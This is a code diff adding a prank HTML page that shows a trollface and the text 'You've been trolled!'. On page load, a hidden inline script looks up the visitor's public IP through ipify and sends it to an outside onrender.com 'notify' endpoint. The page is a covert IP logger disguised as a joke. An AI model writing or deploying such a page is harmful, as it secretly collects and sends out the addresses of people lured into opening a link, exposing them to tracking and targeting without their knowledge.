@@ -1,0 +1,22 @@
+<html>
+<head>
+    <title>You've been trolled!</title>
+    <link rel="stylesheet" href="./index.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&family=Roboto:wght@500&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        $.getJSON("https://api.ipify.org?format=json",
+            function (data) {
+                $.get("https://sertgrtehetrhefg.onrender.com/notify/" + data.ip)
+            })
+    </script>
+</head>
+<body>
+    <div class="middleContainer">
+        <img alt="trollface" src="https://www.bohnice.wtf/img/Trollface.webp">
+        <h1>You've been trolled! XDDDDDDD</h1>
+    </div>
+</body>
+</html>
